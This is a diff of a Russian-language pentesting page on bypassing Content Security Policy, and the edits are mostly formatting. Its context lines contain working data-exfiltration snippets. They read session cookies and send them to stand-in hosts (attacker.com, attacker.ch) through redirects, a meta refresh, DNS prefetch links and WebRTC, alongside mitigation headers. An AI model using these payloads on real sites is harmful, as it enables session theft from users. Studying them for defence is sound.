@@ -226,10 +226,9 @@ ________
 - Секреты в URL, становящиеся доступными для истории, логов, аналитики, обратных прокси и cross-origin заголовков Referer
 
 **Защитные меры:** настоящее исправление — устранение HTML-инъекции. Защита в глубину включает принудительное использование POST для форм с учётными данными, установку явной ограничительной `Referrer-Policy` (например, `no-referrer` или `same-origin`) и аудит того, автозаполняют ли менеджеры паролей внедрённые атакующим формы, отображаемые на доверенных origin.
-```
 
-Файл сохранён как `credential-theft-same-origin-get-referer.md`.
-**Сторонние конечные точки (Third Party Endpoints) + ('unsafe-eval')**
+
+## **Сторонние конечные точки (Third Party Endpoints) + ('unsafe-eval')**
 
 **Предупреждение:** Для некоторых из следующих полезных нагрузок `unsafe-eval` даже не требуется.
 
@@ -761,7 +760,7 @@ var sessionid = document.cookie.split("=")[1] + "."
 document.location = "https://attacker.com/?" + sessionid
 ```
 
-**Meta-тег**
+## **Meta-тег**
 
 Вы можете перенаправить, внедрив мета-тег (это просто перенаправление, это не приведет к утечке содержимого).
 
@@ -769,12 +768,12 @@ document.location = "https://attacker.com/?" + sessionid
 <meta http-equiv="refresh" content="1; http://attacker.com" />
 ```
 
-**Предварительная выборка DNS (DNS Prefetch)**
+## **Предварительная выборка DNS (DNS Prefetch)**
 
 Чтобы ускорить загрузку страниц, браузеры предварительно разрешают имена хостов в IP-адреса и кэшируют их для последующего использования.
 Вы можете указать браузеру предварительно разрешить имя хоста с помощью: `<link rel="dns-prefetch" href="something.com">`
 
-Вы можете использовать это поведение для кражи конфиденциальной информации через DNS-запросы:
+* Вы можете использовать это поведение для кражи конфиденциальной информации через DNS-запросы:
 
 ```javascript
 var sessionid = document.cookie.split("=")[1] + "."
@@ -786,7 +785,7 @@ body.innerHTML =
   'attacker.ch">'
 ```
 
-Другой способ:
+* Другой способ:
 
 ```javascript
 const linkEl = document.createElement("link")
@@ -795,7 +794,7 @@ linkEl.href = urlWithYourPreciousData
 document.head.appendChild(linkEl)
 ```
 
-Чтобы предотвратить это, сервер может отправить HTTP-заголовок:
+* Чтобы предотвратить это, сервер может отправить HTTP-заголовок:
 
 ```
 X-DNS-Prefetch-Control: off
@@ -803,11 +802,13 @@ X-DNS-Prefetch-Control: off
 
 **Подсказка:** По-видимому, эта техника не работает в безголовых браузерах (ботах).
 
-**WebRTC**
+## **WebRTC**
 
 На многих страницах можно прочитать, что WebRTC не проверяет политику `connect-src` CSP.
 
-На самом деле вы можете отправлять информацию, используя DNS-запрос. Проверьте этот код:
+На самом деле вы можете отправлять информацию, используя DNS-запрос. 
+
+* Проверьте этот код:
 
 ```javascript
 ;(async () => {
@@ -817,7 +818,7 @@ X-DNS-Prefetch-Control: off
 })()
 ```
 
-Другой вариант:
+* Другой вариант:
 
 ```javascript
 var pc = new RTCPeerConnection({
@@ -831,7 +832,7 @@ var pc = new RTCPeerConnection({
 pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp));
 ```
 
-**CredentialsContainer**
+## **CredentialsContainer**
 
 Всплывающее окно с учетными данными отправляет DNS-запрос на `iconURL` без ограничений со стороны страницы. Это работает только в безопасном контексте (HTTPS) или на localhost.
 
